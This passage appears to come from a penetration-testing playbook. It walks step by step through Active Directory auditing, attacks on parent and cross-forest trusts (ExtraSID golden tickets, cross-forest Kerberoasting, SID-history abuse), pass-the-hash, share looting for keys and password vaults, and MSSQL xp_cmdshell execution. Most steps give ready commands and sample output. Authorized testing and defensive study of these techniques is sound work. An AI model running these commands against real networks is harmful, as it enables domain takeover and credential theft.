
### Additional Auditing

{% stepper %}
{% step %}
#### AD Explorer Snapshot

Snapshot the AD database with Sysinternals AD Explorer for offline, point-in-time analysis.

<mark style="color:$primary;">**What to look for:**</mark> take the snapshot early; later, diff snapshots to spot changes, or browse objects/attributes offline without hammering the DC.

<mark style="color:$primary;">**Next:**</mark> mine the snapshot for attributes other tools skipped (e.g. `userPassword`, custom attributes).

* [ ] Complete
{% endstep %}

{% step %}
#### PingCastle

Run PingCastle for a broad misconfiguration sweep and risk score.

<mark style="color:$primary;">**What to look for:**</mark> the HTML report's high-risk findings (stale admins, delegation, trust issues) and the overall maturity score.

<mark style="color:$primary;">**Next:**</mark> turn each high-risk finding into a concrete attack or a report recommendation.

* [ ] Complete
{% endstep %}

{% step %}
#### Group3r

Run Group3r to find vulnerabilities inside Group Policy objects.

<mark style="color:$primary;">**What to look for:**</mark> GPO findings - scheduled tasks, mapped drives with creds, privilege assignments.

<mark style="color:$primary;">**Next:**</mark> chase any GPO you can write to, or any cred a GPO leaks.

* [ ] Complete
{% endstep %}

{% step %}
#### ADRecon

Run `ADRecon.ps1` for a broad report of AD config and anything missed elsewhere.

<mark style="color:$primary;">**What to look for:**</mark> the Excel report's sheets on users, computers, SPNs, and delegation.

<mark style="color:$primary;">**Next:**</mark> reconcile against BloodHound to catch gaps.

* [ ] Complete
{% endstep %}
{% endstepper %}

### Attacking AD Trusts (Parent Domain)

{% stepper %}
{% step %}
#### Discover Trusts

Enumerate trusts with [powerview.md](../toolbox/tooling/post-exploitation/powersploit/powerview.md "mention") / [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention"). See [domain-trust-abuse.md](../field-manual/exploitation/initial-access/domain-trust-abuse.md "mention").

```bash
nxc ldap <dc-ip> -u user -p 'pass' -M enum_trusts
```

<mark style="color:$primary;">**What to look for:**</mark> trust partner, **direction**, and whether it's within the forest (SID history/ExtraSID applies) or cross-forest.

```
Source: child.domain.local  Target: domain.local  Direction: Bidirectional  Type: ParentChild
```

<mark style="color:$primary;">**Next:**</mark> ParentChild + DA in the child > ExtraSID attack (next step).

* [ ] Complete
{% endstep %}

{% step %}
#### ExtraSID (Child → Parent)

From DA in a child domain, forge a golden ticket carrying the Enterprise Admins SID to own the forest root. See golden-ticket-silver-ticket-attacks.

```bash
raiseChild.py -target-exec <parent-dc> child.domain.local/childadmin:'pass'
```

<mark style="color:$primary;">**What to look for:**</mark> the script dumping the parent domain's `Administrator`/`krbtgt` after escalation.

```
[*] Target user is Administrator
[*] Dumping Domain Credentials (domain.local)
Administrator:500:aad3b...:...
```

<mark style="color:$primary;">**Next:**</mark> you now hold forest-root creds - confirm with `nxc smb <parent-dc> -u Administrator -H <hash>`.

* [ ] Complete
{% endstep %}
{% endstepper %}

### Attacking AD Trusts (Cross Forest)

{% stepper %}
{% step %}
#### Discover Trusts

Enumerate trusts and note the direction (cross-forest trusts have SID filtering, so ExtraSID won't work). Use [powerview.md](../toolbox/tooling/post-exploitation/powersploit/powerview.md "mention") or [bloodhound](../toolbox/tooling/information-gathering/windows-enumeration/domain-enumeration/bloodhound/ "mention").

<mark style="color:$primary;">**What to look for:**</mark> `Type: Forest` / external trusts and their direction.

<mark style="color:$primary;">**Next:**</mark> pursue cross-forest Kerberoasting and credential reuse (below) rather than SID-history.

* [ ] Complete
{% endstep %}

{% step %}
#### Cross-Forest Kerberoasting

Request SPN tickets across the trust and crack offline.

{% code overflow="wrap" %}
```bash
impacket-GetUserSPNs domain.local/user:'pass' -target-domain <foreign.forest> -request
```
{% endcode %}

<mark style="color:$primary;">**What to look for:**</mark> `$krb5tgs$` hashes from the foreign forest.

<mark style="color:$primary;">**Next:**</mark> crack (`hashcat -m 13100`); a cracked foreign service account is a foothold in the other forest.

* [ ] Complete
{% endstep %}

{% step %}
#### Credential Reuse

If admin accounts share names across domains and one is compromised, test reuse against the trusted domain.

```bash
nxc smb <foreign-dc> -u Administrator -H <nthash>
```

<mark style="color:$primary;">**What to look for:**</mark> a `[+]` / `(Pwn3d!)` against the foreign DC.

<mark style="color:$primary;">**Next:**</mark> on success, enumerate the foreign domain from scratch.

* [ ] Complete
{% endstep %}

{% step %}
#### SID-History Abuse

Where SID filtering is absent, inherit privileged access via SID history across the trust.

<mark style="color:$primary;">**What to look for:**</mark> trusts configured without SID filtering (quarantine disabled).

<mark style="color:$primary;">**Next:**</mark> inject the target domain's privileged SID into a ticket to access its resources.

* [ ] Complete
{% endstep %}
{% endstepper %}

***

## Additional Methods

{% stepper %}
{% step %}
#### Interactive Access (RDP / WinRM)

Access a host via RDP or [evil-winrm.md](../toolbox/tooling/post-exploitation/evil-winrm.md "mention").

```bash
evil-winrm -i <target> -u user -p 'pass'
```

<mark style="color:$primary;">**What to look for:**</mark> a shell prompt (`*Evil-WinRM* PS C:\>`), then confirm context with `whoami /all`.

<mark style="color:$primary;">**Next:**</mark> run local enumeration (> Windows PrivEsc playbook) or loot for creds.

* [ ] Complete
{% endstep %}

{% step %}
#### Admin Authentication (PsExec / PtH)

Authenticate as admin with [psexec.md](../toolbox/tooling/post-exploitation/psexec.md "mention"), or pass-the-hash if you hold an NThash. See [pass-the-hash-overpass-the-hash.md](../field-manual/exploitation/initial-access/pass-the-hash-overpass-the-hash.md "mention").

```bash
impacket-psexec domain.local/user:'pass'@<target>
nxc smb <target> -u Administrator -H <nthash> -x "whoami"
```

<mark style="color:$primary;">**What to look for:**</mark> a SYSTEM shell (PsExec) or `(Pwn3d!)` / command output (nxc PtH).

```
nt authority\system
```

<mark style="color:$primary;">**Next:**</mark> dump credentials on the new host and repeat the cycle outward.

* [ ] Complete
{% endstep %}

{% step %}
#### Sensitive File Share Access

Access a sensitive share and loot it.

```bash
smbclient //<target>/share -U 'domain.local\user%pass'
```

<mark style="color:$primary;">**What to look for:**</mark> config files, scripts, backups, `.kdbx`, `.ppk`/`id_rsa`, and anything with "pass" in the name.

<mark style="color:$primary;">**Next:**</mark> feed recovered creds/keys back into the credentialed flow.

* [ ] Complete
{% endstep %}

{% step %}
#### MSSQL as DBA

Gain MSSQL access as a DBA and leverage it for execution.

```bash
impacket-mssqlclient domain.local/user:'pass'@<target> -windows-auth
```

<mark style="color:$primary;">**What to look for:**</mark> a SQL prompt; check your role with `SELECT IS_SRVROLEMEMBER('sysadmin');` (returns `1` if DBA).

<mark style="color:$primary;">**Next:**</mark> as sysadmin, enable and use `xp_cmdshell` for OS command execution, or relay/impersonate for lateral movement.

* [ ] Complete
{% endstep %}
{% endstepper %}
